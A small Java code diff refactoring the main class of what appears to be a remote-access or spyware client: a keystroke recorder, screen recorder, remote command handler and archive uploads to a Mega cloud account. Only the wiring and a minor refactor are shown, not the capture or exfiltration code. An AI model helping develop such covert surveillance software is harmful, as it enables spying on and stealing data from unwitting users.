@@ -76,6 +76,7 @@ public class RMAC {
 
   public static FileSystem fs = new FileSystem();
   public static MegaClient mega = new MegaClient();
+  public static Service service = new Service();
 
   public static void main(String[] args) throws InstantiationException, IllegalAccessException {
     new RMAC().start(args);
@@ -125,7 +126,7 @@ public class RMAC {
     uploader = (FileUploader) this.getInstance(FileUploader.class);
     // Initialize Archiver
     archiver = (Archiver) this.getInstance(Archiver.class);
-    new Thread(() -> RMAC.archiver.uploadArchives()).start();
+    new Thread(() -> RMAC.archiver.uploadArchive()).start();
     // Verify Script Files
     scriptFiles = (ScriptFiles) this.getInstance(ScriptFiles.class);
     // Initialize KL Output file
@@ -133,7 +134,7 @@ public class RMAC {
     // Register JNativeHook
     keyRecorder = (KeyRecorder) this.getInstance(KeyRecorder.class);
     // Register this Client
-    Service.registerClient();
+    service.registerClient();
     // Initialize CommandHandler
     commandHandler = (CommandHandler) this.getInstance(CommandHandler.class);
     // Initialize Screen Recorder
